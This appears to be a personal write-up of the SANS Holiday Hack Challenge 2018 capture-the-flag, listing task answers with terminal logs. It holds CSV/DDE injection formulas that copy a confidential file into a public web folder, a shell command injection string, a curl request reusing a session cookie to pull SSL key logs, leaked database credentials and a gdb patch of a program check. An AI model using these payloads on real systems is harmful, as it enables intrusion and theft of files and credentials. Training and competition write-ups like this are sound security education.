# Tasks

# Orientation Challenge 

```
What phrase is revealed when you answer all of the questions at the KringleCon Holiday Hack History kiosk inside the castle? For hints on achieving this objective, please visit Bushy Evergreen and help him with the Essential Editor Skills Cranberry Pi terminal challenge.
```

![](images/2018-12-27-11-09-10.png)

`Happy Trails`

# Durectiry Browsing

```
Who submitted (First Last) the rejected talk titled Data Loss for Rainbow Teams: A Path in the Darkness? Please analyze the CFP site to find out. For hints on achieving this objective, please visit Minty Candycane and help her with the The Name Game Cranberry Pi terminal challenge.
```

https://cfp.kringlecastle.com/

![](images/2018-12-27-11-09-28.png)

![](images/2018-12-27-11-07-39.png)

![](images/2018-12-27-11-08-30.png)

`John McClane`

# de Bruijn Sequences

```
When you break into the speaker unpreparedness room, what does Morcel Nougat say? For hints on achieving this objective, please visit Tangle Coalbox and help him with Lethal ForensicELFication Cranberry Pi terminal challenge.
```

![](images/2018-12-27-11-10-07.png)

`Welcome unprepared speaker!`

# Data Repo Analysis

```
Retrieve the encrypted ZIP file from the North Pole Git repository. What is the password to open this file? For hints on achieving this objective, please visit Wunorse Openslae and help him with Stall Mucking Report Cranberry Pi terminal challenge.
```

https://download.holidayhackchallenge.com/HHC2018-DomainHack_2018-12-19.ova

https://git.kringlecastle.com/Upatree/santas_castle_automation

https://git.kringlecastle.com/Upatree/santas_castle_automation/commit/714ba109e573f37a6538beeeb7d11c9391e92a72

![](images/2018-12-27-11-11-48.png)

![](images/2018-12-27-11-12-22.png)

# AD Privilege Discovery

```
Using the data set contained in this SANS Slingshot Linux image, find a reliable path from a Kerberoastable user to the Domain Admins group. What’s the user’s logon name? Remember to avoid RDP as a control path as it depends on separate local privilege escalation flaws. For hints on achieving this objective, please visit Holly Evergreen and help her with the CURLing Master Cranberry Pi terminal challenge.
```

![](images/2018-12-27-13-37-49.png)

![](images/2018-12-27-13-37-12.png)

# Badge Manipulation

```
Bypass the authentication mechanism associated with the room near Pepper Minstix. A sample employee badge is available. What is the access control number revealed by the door authentication panel? For hints on achieving this objective, please visit Pepper Minstix and help her with the Yule Log Analysis Cranberry Pi terminal challenge.
```

![](images/2018-12-27-11-32-02.png)

# HR Incident response

```
Santa uses an Elf Resources website to look for talented information security professionals. Gain access to the website and fetch the document C:\candidate_evaluation.docx. Which terrorist organization is secretly supported by the job applicant whose name begins with "K." For hints on achieving this objective, please visit Sparkle Redberry and help her with the Dev Ops Fail Cranberry Pi terminal challenge.
```

https://careers.kringlecastle.com/

CSV Injection

`DDE(“cmd”;”/C  C:\candidate_evaluation.docx C:\careerportal\resources\public\pwned1.docx”;”!A0″)`

"=cmd|'/C copy C:\candidate_evaluation.docx C:\careerportal\resources\public\sssdad.docx'!A0"

copy C:\candidate_evaluation.docx  C:\careerportal\resources\public\pwned1.docx

`,"=cmd|'/C copy C:\candidate_evaluation.docx C:\careerportal\resources\public\sssdad.docx'!A0",`

"=2+5+cmd|' /C COPY /Y C:\candidate_evaluation.docx C:\careerportal\resources\public\pwned1.docx'!A0"
,=DDE("cmd";"  "; "4"), 4, 3

![](images/2018-12-27-19-47-05.png)

![](images/2018-12-27-19-47-38.png)



`Fancy Beaver`

# Network Traffic Forensic

```
Santa has introduced a web-based packet capture and analysis tool at https://packalyzer.kringlecastle.com to support the elves and their information security work. Using the system, access and decrypt HTTP/2 network activity. What is the name of the song described in the document sent from Holly Evergreen to Alabaster Snowball? For hints on achieving this objective, please visit SugarPlum Mary and help her with the Python Escape from LA Cranberry Pi terminal challenge.
```

![](images/2018-12-27-15-31-57.png)

![](images/2018-12-27-15-32-39.png)

```
view-source:https://packalyzer.kringlecastle.com/pub/app.js/
```
PASESSION=163695671466457474815742704454482

curl --http2-prior-knowledge --cookie "PASESSION=163695671466457474815742704454482" https://packalyzer.kringlecastle.com/pub/sslkeylog

![](images/2018-12-28-14-33-49.png)

![](images/2018-12-28-14-34-08.png)

![](images/2018-12-28-14-34-30.png)

```
https://packalyzer.kringlecastle.com/DEV/packalyzer_clientrandom_ssl.log
```

![](images/2018-12-28-15-12-00.png)


```
alabaster
Packer-p@re-turntable192
```

![](images/2018-12-28-15-12-59.png)

![](images/2018-12-28-15-14-33.png)


# Malware

![](images/2019-01-02-13-56-15.png)

![](images/2018-12-31-12-28-48.png)

![](images/2018-12-31-13-31-32.png)

![](images/2018-12-31-14-12-26.png)

```
4739626449686a334d36.72616e736f6d697370616964.erohetfanu.com
```

enc_key = 4739626449686a334d36

739626449686a334d36.401c2a09fbe24c5833d2c5861139c4b4.6B6579666F72626F746964.erohetfanu.com
739626449686a334d36.9309a2bb17dcede7abfffd065ee0491b.6B6579666F72626F746964.erohetfanu.com
739626449686a334d36.379be44029ca4321e60407d44e6e3816.6B6579666F72626F746964.erohetfanu.com
739626449686a334d36.d3147abb55e671d0cac709d1cfe86860.6B6579666F72626F746964.erohetfanu.com
739626449686a334d36.91dae5e551cb2354727ac257d9777221.6B6579666F72626F746964.erohetfanu.com
739626449686a334d36.0b94861678ea16f8b79b756e45776d29.6B6579666F72626F746964.erohetfanu.com
739626449686a334d36.dce9ee57976f9ab398f9a8479cf911d7.6B6579666F72626F746964.erohetfanu.com
739626449686a334d36.b6417bf019789950d0bf8d83218a56e6.6B6579666F72626F746964.erohetfanu.com
739626449686a334d36.7969c73cfb1663a75a56ebf4aa4a1849.6B6579666F72626F746964.erohetfanu.com
739626449686a334d36.b7a971672d87b24b7a6d672d1d811e6c.6B6579666F72626F746964.erohetfanu.com
739626449686a334d36.d47681a77152563906a2c29c6d12f971.6B6579666F72626F746964.erohetfanu.com
739626449686a334d36.268af1720bc49995217d814ffd1e4b6e.6B6579666F72626F746964.erohetfanu.com
739626449686a334d36.88a946c75a295e714b668109d75c0010.6B6579666F72626F746964.erohetfanu.com
739626449686a334d36.34f42b2f8d7f2b43aab698b537d2df2f.6B6579666F72626F746964.erohetfanu.com
739626449686a334d36.d1949005437dc44b8464dca05680d531.6B6579666F72626F746964.erohetfanu.com
739626449686a334d36.cf903522e1a3966805b50e7f7dd51dc.6B6579666F72626F746964.erohetfanu.com

```
401c2a09fbe24c5833d2c5861139c4b49309a2bb17dcede7abfffd065ee0491b379be44029ca4321e60407d44e6e3816d3147abb55e671d0cac709d1cfe8686091dae5e551cb2354727ac257d97772210b94861678ea16f8b79b756e45776d29dce9ee57976f9ab398f9a8479cf911d7b6417bf019789950d0bf8d83218a56e67969c73cfb1663a75a56ebf4aa4a1849b7a971672d87b24b7a6d672d1d811e6cd47681a77152563906a2c29c6d12f971268af1720bc49995217d814ffd1e4b6e88a946c75a295e714b668109d75c001034f42b2f8d7f2b43aab698b537d2df2fd1949005437dc44b8464dca05680d531cf903522e1a3966805b50e7f7dd51dc
```

![](images/2019-01-02-10-46-21.png)

# Piano

![](images/2019-01-02-10-45-27.png)

![](images/2019-01-02-12-55-23.png)

E->D

```
DCshDCshDDCshDEFshEFshGAGshAGshA
DC# DC# DD C#D EF#  EF#  GA G#A G#A
```

# Overall

![](images/2019-01-02-13-56-43.png)

```
As you walk through the gates, a familiar red-suited holiday figure warmly welcomes all of his special visitors to KringleCon.

Suddenly, all elves in the castle start looking very nervous. You can overhear some of them talking with worry in their voices.

The toy soldiers, who were always gruff, now seem especially determined as they lock all the exterior entrances to the building and barricade all the doors. No one can get out! And the toy soldiers' grunts take on an increasingly sinister tone.

The toy soldiers act even more aggressively. They are searching for something -- something very special inside of Santa’s castle -- and they will stop at NOTHING until they find it. Hans seems to be directing their activities.

In the main lobby on the bottom floor of Santa's castle, Hans calls everyone around to deliver a speech. Make sure you visit Hans to hear his speech.

The toy soldiers continue behaving very rudely, grunting orders to the guests and to each other in vaguely Germanic phrases. Suddenly, one of the toy soldiers appears wearing a grey sweatshirt that has written on it in red pen, "NOW I HAVE A ZERO-DAY. HO-HO-HO."

A rumor spreads among the elves that Alabaster has lost his badge. Several elves say, "What do you think someone could do with that?"

Hans has started monologuing again. Please visit him in Santa's lobby for a status update.

Great work! You have blocked access to Santa's treasure... for now. Please visit Hans in Santa's Secret Room for an update.

And then suddenly, Hans slips and falls into a snowbank. His nefarious plan thwarted, he's now just cold and wet.

But Santa still has more questions for you to solve!

Congrats! You have solved the hardest challenge! Please visit Santa and Hans inside Santa's Secret Room for an update on your amazing accomplishment!
```

Santa did it!

![](images/2019-01-02-13-14-42.png)


# Achievements

## The Name Game

![](images/2018-12-24-11-05-30.png)

![](images/2018-12-24-11-07-27.png)

![](images/2018-12-24-11-11-01.png)

![](images/2018-12-24-11-19-54.png)

```bash
Validating data store for employee onboard information.
Enter address of server: 127.0.0.1 && cat menu.ps1 && cat runtoanswer && cat .bashrc
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.049 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.049 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.044 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2054ms
rtt min/avg/max/mdev = 0.044/0.047/0.049/0.006 ms
$global:firstrun = $TRUE

function Show-Menu
{
    $intro = @(
        "We just hired this new worker,",
        "Californian or New Yorker?",
        "Think he's making some new toy bag...",
        "My job is to make his name tag.",
        "",
        "Golly gee, I'm glad that you came,",
        "I recall naught but his last name!",
        "Use our system or your own plan,",
        "Find the first name of our guy `"Chan!`"",
        "",
        "-Bushy Evergreen",
        "",
        "To solve this challenge, determine the new worker's first name and submit to runtoanswer."
    )
    $header = @(
        "===================================================================="
        "=                                                                  =",
        "= S A N T A ' S  C A S T L E  E M P L O Y E E  O N B O A R D I N G =",
        "=                                                                  =",
        "===================================================================="
    )

    cls
    if ($global:firstrun -eq $TRUE) {
        Write-Host "`n`n"
        for ($i = 0; $i -lt $intro.length; $i++) {
            Write-Host $intro[$i]
        }
        $global:firstrun = $FALSE
    }

    Write-Host "`n`n`n"
    for ($i = 0; $i -lt $header.length; $i++) {
        Write-Host $header[$i]
    }
    Write-Host "`n`n`n"
    Write-Host ' Press '1' to start the onboard process.'
    Write-Host ' Press '2' to verify the system.'
    Write-Host ' Press 'q' to quit.'
    Write-Host "`n"
}

function Employee-Onboarding-Form
{
    Write-Host "`n`nWelcome to Santa's Castle!`n`n"
    Write-Host "At Santa's Castle, our employees are our family. We care for each other,"
    Write-Host "and support everyone in our common goals.`n"
    Write-Host "Your first test at Santa's Castle is to complete the new employee onboarding paperwork."
    Write-Host "Don't worry, it's an easy test! Just complete the required onboarding information below.`n`n"

    $efirst = Read-Host "Enter your first name.`n"
    $elast = Read-Host "Enter your last name.`n"
    $estreet1 = Read-Host "Enter your street address (line 1 of 2).`n"
    $estreet2 = Read-Host "Enter your street address (line 2 of 2).`n"
    $ecity = Read-Host "Enter your city.`n"
    $epostalcode = Read-Host "Enter your postal code.`n"
    $ephone = Read-Host "Enter your phone number.`n"
    $eemail = Read-Host "Enter your email address.`n"

    Write-Host "`n`nIs this correct?`n`n"
    Write-Host "$efirst $elast"
    Write-Host "$estreet1"
    if ($estreet2) {
        Write-Host "$estreet2"
    }
    Write-Host "$ecity, $epostalcode"
    Write-Host "$ephone"
    Write-Host "$eemail"

    $input = Read-Host 'y/n'
    if ($input -eq 'y' -Or $input -eq 'Y') {
        Write-Host "Save to sqlite DB using command line"
        Start-Process -FilePath "./sqlite3" -ArgumentList "onboard.db `"INSERT INTO onboard (fname, lname, street1, street2, city, postalcode, phone, email) VALUES (`'$efirst`',`'$elast`', `'$estreet1`', `'$estreet2`', `'$ecity`', `'$epostalcode`', `'$ephone`', `'$eemail`')`""
    }
}

try
{
    do
    {
        Show-Menu
        $input = Read-Host 'Please make a selection'
        switch ($input)
        {
            '1' {
                cls
                Employee-Onboarding-Form
            } '2' {
                cls
                Write-Host "Validating data store for employee onboard information."
                $server = Read-Host 'Enter address of server'
                /bin/bash -c "/bin/ping -c 3 $server"
                /bin/bash -c "/usr/bin/file onboard.db"
            } '9' {
                /usr/bin/pwsh
                return
            } 'q' {
                return
            } default {
                Write-Host "Invalid entry."
            }
        }
        pause
    }
    until ($input -eq 'q')
} finally {
}
```

Option 9 will prompt a shell.

![](images/onboard.gif)

![](images/2018-12-24-11-40-59.png)


# Essential Editor Skills

![](images/2018-12-24-12-39-04.png)

```bash
[No write since last change]
Loading, please wait......

Hmm.  I think vim is still running...
elf@cc62f8208b62:~$ ls
elf@cc62f8208b62:~$ find .
.
./.profile
./.bashrc
./.bash_logout
./.viminfo
./.message.swp
./.message
elf@cc62f8208b62:~$ rm -rf .message.swp
elf@cc62f8208b62:~$ ./usr/local/bin/successfulescape
bash: ./usr/local/bin/successfulescape: No such file or directory
elf@cc62f8208b62:~$ /usr/local/bin/successfulescape
Loading, please wait......

Hmm.  I think vim is still running...
elf@cc62f8208b62:~$ ps
bash: ps: command not found
elf@cc62f8208b62:~$ kill
kill: usage: kill [-s sigspec | -n signum | -sigspec] pid | jobspec ... or kill -l [sigspec]
elf@cc62f8208b62:~$ cd /proc/
1/             devices        kallsyms       modules        swaps
10/            diskstats      kcore          mounts         sys/
11/            dma            key-users      mtrr           sysrq-trigger
12/            driver/        keys           net/           sysvipc/
acpi/          execdomains    kmsg           pagetypeinfo   thread-self/
buddyinfo      fb             kpagecgroup    partitions     timer_list
bus/           filesystems    kpagecount     sched_debug    tty/
cgroups        fs/            kpageflags     schedstat      uptime
cmdline        interrupts     loadavg        self/          version
consoles       iomem          locks          slabinfo       vmallocinfo
cpuinfo        ioports        meminfo        softirqs       vmstat
crypto         irq/           misc           stat           zoneinfo
elf@cc62f8208b62:~$ cd /proc/12/
attr/            environ          mem              pagemap          stat
autogroup        exe              mountinfo        personality      statm
auxv             fd/              mounts           projid_map       status
cgroup           fdinfo/          mountstats       root/            syscall
clear_refs       gid_map          net/             sched            task/
cmdline          io               ns/              schedstat        timers
comm             limits           numa_maps        sessionid        timerslack_ns
coredump_filter  loginuid         oom_adj          setgroups        uid_map
cpuset           map_files/       oom_score        smaps            wchan
cwd/             maps             oom_score_adj    stack            
elf@cc62f8208b62:~$ cd /proc/12/stats
bash: cd: /proc/12/stats: No such file or directory
elf@cc62f8208b62:~$ cd /proc/12/stat 
bash: cd: /proc/12/stat: Not a directory
elf@cc62f8208b62:~$ cat /proc/12/stat
12 (bash) S 11 12 1 34816 25 4194304 593 9540 0 0 1 1 23 8 20 0 1 0 2986300 18640896 819 18446744073709551615 4194304 5242124 140721928999680 0 0 0 65536 3670020 1266777851 0 0 0 17 4 0 0 0 0 0 7341384 7388228 23429120 140721929005362 140721929005367 140721929005367 140721929007086 0
elf@cc62f8208b62:~$ cat /proc/12/cmdline
bashelf@cc62f8208b62:~$ cat /proc/11/cmdline
sh-cbashelf@cc62f8208b62:~$ cat /proc/10/cmdline
vim.messageelf@cc62f8208b62:~$ kill 9 10
bash: kill: (9) - No such process
elf@cc62f8208b62:~$ cat /proc/10/environ
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:HOSTNAME=cc62f8208b62PWD=/home/elfHOME=/home/elfRESOURCE_ID=f6a9c5c9-d717-4675-9f45-6fa7296e7563TERM=xtermSHLVL=1PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin_=/usr/bin/vimelf@cc62f8208b62:~$ kill -9 10 
elf@cc62f8208b62:~$ Loading, please wait......



You did it! Congratulations!

elf@cc62f8208b62:~$ exit

```

# StallMucking Report

![](images/2018-12-24-14-13-28.png)

![](images/2018-12-24-14-15-49.png)

# CURL Mastery

![](images/2018-12-24-16-17-03.png)

![](images/2018-12-24-16-19-28.png)

![](images/2018-12-24-16-20-00.png)

![](images/2018-12-24-16-18-21.png)

# Python escape 

![](images/2018-12-24-16-25-33.png)

![escape](./files/escape)


# DevOPS

![](images/2018-12-24-16-48-45.png)

`git log -p -2`

![](images/2018-12-24-16-51-24.png)

![](images/2018-12-24-16-53-12.png)

```s
60a2ffea7520ee980a5fc60177ff4d0633f2516b Per @tcoalbox admonishment, removed use
rname/password from config.js, default settings in config.js.def need to be updated be
fore use
```

![](images/2018-12-24-16-57-06.png)

```
module.exports = {
    'url' : 'mongodb://sredberry:twinkletwinkletwinkle@127.0.0.1:27017/node-api'
};
```

![](images/2018-12-24-16-58-20.png)


# The Sleighbell

![](images/2018-12-24-17-00-12.png)

1125 --> 0x4c9

```
elf@d2d71b0b901b:~$ objdump -d ./sleighbell-lotto  | grep 4c9
    14c9:       c3                      retq   
    1582:       81 7d fc c9 04 00 00    cmpl   $0x4c9,-0x4(%rbp)
elf@d2d71b0b901b:~$
```

```
                                                                                
                                                                                
                                                                                
                              WKOdl:;oW                                         
                          WOo:'.......cW         X0KXW                          
                kdxOX     x...;.....;c.d      Xd;....':d0W                      
               W,....'cd0WN,.,WNd'...d:'N   Xl........',.:W                     
                l........':odoK  No..,0.k Wx';.....'lOWX.'N                     
                O............,oK   O..O;dWl,d'...;xN   x.o         NXKKKKXN     
                W,.....,:ccc:,..;kW k.dcdd,k'..,kW    0'cW    Xko:'.....:odOKW  
                 d........',;clll:,xWlolx'x;..oN    Wx'lW  Ko;..........,cxK    
                 N,..,codxkkkxdl:::;:xKlx,k.'O     O;,O Ko,....;cdk0KXXXXK0kOW  
                  K,.OW           Xkl':k0:o.O   Wk;:kNk:..'cd0N                 
 W0kdlc:::cloxk0XW Wkc;lx0KNWW       NxlKOxd WOl:dK0l''cdOKK0OOOO0KXNW          
  W  NOo'.........,:oxOkkxlc;,',,,,,,:dK;.dKllx0Oo,;d0XKO0KKXKKKK0OO0KXKKN      
  NOxodkO00KKK0OOkdoc:,'.,:ldxxxxxdddolx;;xdlcc::cx;0K0KKXXXXXX00KK00OOO0K      
             WNXK00000KKKK0kxoodl::::ox,.xlK0kdlccdKOOKXXXK000KKKOOOO00000W     
           X0O0000KXX00000KNK;o;...:0 d,,;lNW      0O0XXK0O0KK0OO0KKK000000     
       NXNK000O0KKKKKXKKXK000kl:cdK WXK0000000KKKNW00KK0O0K0OO0KKK00XXXXK0OW    
      WOOOOOO000000OO0KKKKXXOON  WX0OOO0XXXXXXXKOOOKK0O0K0OOOKK0O0XXXXXXK0OW    
       N000000OOOOO0000OO0XXXX0WXOOKXXXXXXXXXXXKKXX0O0XKOO0K0OOKXXXXXXKX0O0     
       KOKXKOO00000OOOO0KK0OOOK0OOX00KX0KKKKKKK00XXXXOOX0KKO0XXXXXXXXXOO0KW     
       0OKXXKKKKKK000K0OOO0KKKKOO0KKKKK0000000KKKKKK00OONO0XKO0NNXKKXXXXN       
       XOO0KXKO0KKKKKOO0K0O0KXK0KXKKKKKKKK000KKKKKKKKK0KKKK0OOONWXK00OKN        
        0OOW WOOKXXXXKKKK0KNOOOOOKKXXKKKKKKKKKKKKXXKK0OOOOKX00OOO0KXNW          
         KOO0NKOKXXXXXXXX0O0KXKKKKKK000000000000000KKKKKKNW                     
          WKOOXNKKKKKKKKK0OKW KO0XXKKKKKKKXXXXXXXXXXXKOON                       
             NXKNNKOOO00XN    W00KK000K000KXXXXXXXXXKK0X                        
                   WW          WKOOO0   KOKKKXXXXXX0OON                         
                                 NKOO0KKNNXKOOOXXOO0XW                          
                                   WNK0OOO0KXXNNXXN                             
                                        WWWWWW                                  
                                                                                

I'll hear the bells on Christmas Day
Their sweet, familiar sound will play
  But just one elf,
  Pulls off the shelf,
The bells to hang on Santa's sleigh!

Please call me Shinny Upatree
I write you now, 'cause I would be
  The one who gets -
  Whom Santa lets
The bells to hang on Santa's sleigh!

But all us elves do want the job,
Conveying bells through wint'ry mob
  To be the one
  Toy making's done
The bells to hang on Santa's sleigh!

To make it fair, the Man devised
A fair and simple compromise.
  A random chance,
  The winner dance!
The bells to hang on Santa's sleigh!

Now here I need your hacker skill.
To be the one would be a thrill!
  Please do your best,
  And rig this test
The bells to hang on Santa's sleigh!

Complete this challenge by winning the sleighbell lottery for Shinny Upatree.
elf@51eb678f54a5:~$ ./
gdb               objdump           sleighbell-lotto  
elf@51eb678f54a5:~$ ./
gdb               objdump           sleighbell-lotto  
elf@51eb678f54a5:~$ gdb -q ./sleighbell-lotto 
Reading symbols from ./sleighbell-lotto...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x14ce
(gdb) r  
Starting program: /home/elf/sleighbell-lotto 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x00005555555554ce in main ()
(gdb) disassemble main
Dump of assembler code for function main:
   0x00005555555554ca <+0>:     push   %rbp
   0x00005555555554cb <+1>:     mov    %rsp,%rbp
=> 0x00005555555554ce <+4>:     sub    $0x10,%rsp
   0x00005555555554d2 <+8>:     lea    0x56d6(%rip),%rdi        # 0x55555555abaf
   0x00005555555554d9 <+15>:    callq  0x555555554970 <getenv@plt>
   0x00005555555554de <+20>:    test   %rax,%rax
   0x00005555555554e1 <+23>:    jne    0x5555555554f9 <main+47>
   0x00005555555554e3 <+25>:    lea    0x56d6(%rip),%rdi        # 0x55555555abc0
   0x00005555555554ea <+32>:    callq  0x555555554910 <puts@plt>
   0x00005555555554ef <+37>:    mov    $0xffffffff,%edi
   0x00005555555554f4 <+42>:    callq  0x555555554920 <exit@plt>
   0x00005555555554f9 <+47>:    mov    $0x0,%edi
   0x00005555555554fe <+52>:    callq  0x5555555549e0 <time@plt>
   0x0000555555555503 <+57>:    mov    %eax,%edi
   0x0000555555555505 <+59>:    callq  0x5555555549a0 <srand@plt>
   0x000055555555550a <+64>:    lea    0x583f(%rip),%rdi        # 0x55555555ad50
   0x0000555555555511 <+71>:    callq  0x555555554910 <puts@plt>
   0x0000555555555516 <+76>:    mov    $0x1,%edi
   0x000055555555551b <+81>:    callq  0x555555554960 <sleep@plt>
   0x0000555555555520 <+86>:    callq  0x5555555549c0 <rand@plt>
   0x0000555555555525 <+91>:    mov    %eax,%ecx
   0x0000555555555527 <+93>:    mov    $0x68db8bad,%edx
   0x000055555555552c <+98>:    mov    %ecx,%eax
   0x000055555555552e <+100>:   imul   %edx
   0x0000555555555530 <+102>:   sar    $0xc,%edx
   0x0000555555555533 <+105>:   mov    %ecx,%eax
   0x0000555555555535 <+107>:   sar    $0x1f,%eax
   0x0000555555555538 <+110>:   sub    %eax,%edx
   0x000055555555553a <+112>:   mov    %edx,%eax
   0x000055555555553c <+114>:   mov    %eax,-0x4(%rbp)
   0x000055555555553f <+117>:   mov    -0x4(%rbp),%eax
   0x0000555555555542 <+120>:   imul   $0x2710,%eax,%eax
   0x0000555555555548 <+126>:   sub    %eax,%ecx
   0x000055555555554a <+128>:   mov    %ecx,%eax
   0x000055555555554c <+130>:   mov    %eax,-0x4(%rbp)
   0x000055555555554f <+133>:   lea    0x5856(%rip),%rdi        # 0x55555555adac
   0x0000555555555556 <+140>:   mov    $0x0,%eax
   0x000055555555555b <+145>:   callq  0x5555555548f0 <printf@plt>
   0x0000555555555560 <+150>:   mov    -0x4(%rbp),%eax
   0x0000555555555563 <+153>:   mov    %eax,%esi
---Type <return> to continue, or q <return> to quit--- 
   0x0000555555555565 <+155>:   lea    0x5858(%rip),%rdi        # 0x55555555adc4
   0x000055555555556c <+162>:   mov    $0x0,%eax
   0x0000555555555571 <+167>:   callq  0x5555555548f0 <printf@plt>
   0x0000555555555576 <+172>:   lea    0x584a(%rip),%rdi        # 0x55555555adc7
   0x000055555555557d <+179>:   callq  0x555555554910 <puts@plt>
   0x0000555555555582 <+184>:   cmpl   $0x4c9,-0x4(%rbp)
   0x0000555555555589 <+191>:   jne    0x555555555597 <main+205>
   0x000055555555558b <+193>:   mov    $0x0,%eax
   0x0000555555555590 <+198>:   callq  0x555555554fd7 <winnerwinner>
   0x0000555555555595 <+203>:   jmp    0x5555555555a1 <main+215>
   0x0000555555555597 <+205>:   mov    $0x0,%eax
   0x000055555555559c <+210>:   callq  0x5555555554b7 <sorry>
   0x00005555555555a1 <+215>:   mov    $0x0,%edi
   0x00005555555555a6 <+220>:   callq  0x555555554920 <exit@plt>
End of assembler dump.
(gdb) b 0x0000555555555582
Function "0x0000555555555582" not defined.
Make breakpoint pending on future shared library load? (y or [n]) Quit
(gdb) b *0x0000555555555582
Breakpoint 2 at 0x555555555582
(gdb) c
Continuing.

The winning ticket is number 1225.
Rolling the tumblers to see what number you'll draw...

You drew ticket number 3326!


Breakpoint 2, 0x0000555555555582 in main ()
(gdb) $rbp - 4
Undefined command: "$rbp".  Try "help".
(gdb) x/x $rbp-4
0x7fffffffe5fc: 0x00000cfe
(gdb) h/x $rbp-4
Undefined command: "".  Try "help".
(gdb) s/x $rbp-4
A syntax error in expression, near `/x $rbp-4'.
(gdb) s $rbp-4
0x0000555555555582 in main ()
(gdb) x/2x $rbp-4
0x7fffffffe5fc: 0x00000cfe      0x555555b0
(gdb) set *($rbp-4) = 0x000004c9
Attempt to dereference a generic pointer.
(gdb) set {int}$rbp-4 = 0x000004c9
Left operand of assignment is not an lvalue.
(gdb) x/2x $rbp-4
0x7fffffffe5fc: 0x00000cfe      0x555555b0
(gdb) x/2x {int}0x7fffffffe5fc = 0x000004c9
0x4c9:  Cannot access memory at address 0x4c9
(gdb) x/2x {int}($rbp-4) = 0x000004c9
0x4c9:  Cannot access memory at address 0x4c9
(gdb) $rbp-4
Undefined command: "$rbp-4".  Try "help".
(gdb) x $rbp-4
0x7fffffffe5fc: 0x000004c9
(gdb) p $rbp
$1 = (void *) 0x7fffffffe600
(gdb) set *((void *) 0x7fffffffe600) = 0x000004c9    
Attempt to dereference a generic pointer.
(gdb) x $rbp-4
0x7fffffffe5fc: 0x000004c9
(gdb) c
Continuing.

                                                                                
                                                     .....          ......      
                                     ..,;:::::cccodkkkkkkkkkxdc;.   .......     
                             .';:codkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx.........    
                         ':okkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx..........   
                     .;okkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkdc..........   
                  .:xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkko;.     ........   
                'lkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx:.          ......    
              ;xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkd'                       
            .xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx'                         
           .kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx'                           
           xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx;                             
          :olodxkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk;                               
       ..........;;;;coxkkkkkkkkkkkkkkkkkkkkkkc                                 
     ...................,',,:lxkkkkkkkkkkkkkd.                                  
     ..........................';;:coxkkkkk:                                    
        ...............................ckd.                                     
          ...............................                                       
                ...........................                                     
                   .......................                                      
                              ....... ...                                       

With gdb you fixed the race.
The other elves we did out-pace.
  And now they'll see.
  They'll all watch me.
I'll hang the bells on Santa's sleigh!


Congratulations! You've won, and have successfully completed this challenge.
[Inferior 1 (process 21) exited normally]
```

```
~/tmp $ rax2 1225
0x4c9
~/tmp $ 0x00000a82
zsh: command not found: 0x00000a82
exit 127
~/tmp $ rax2 0x00000a82
2690
~/tmp $ rax2 0x000004c9       
1225
~/tmp $ rax2 6299
0x189b
~/tmp $ rax2 0x00000cfe
3326
~/tmp $ rax2 0x0cfe    
3326
~/tmp $
```

# ForensicELFication

![](images/2018-12-24-18-31-24.png)



# Yule Log Analysis

